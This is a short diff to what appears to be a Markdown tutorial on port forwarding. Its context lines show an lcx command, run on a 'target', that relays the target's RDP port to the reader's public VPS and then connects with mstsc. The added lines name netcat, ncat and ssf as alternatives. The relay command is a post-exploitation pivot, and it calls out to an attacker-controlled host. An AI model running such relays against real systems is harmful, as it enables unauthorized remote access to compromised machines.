@@ -155,3 +155,5 @@ For target:
 lcx -slave x.x.x.x 2222 127.0.0.1 3389
 ```
 The IP x.x.x.x is the address of your public VPS. Finally execute ```mstsc x.x.x.x:3333``` to connect to the remote desktop of the target.
+
+There are many other useful tools except for the tools I mentioned above, such as netcat, ncat and ssf. You can make a choice among them as you like.
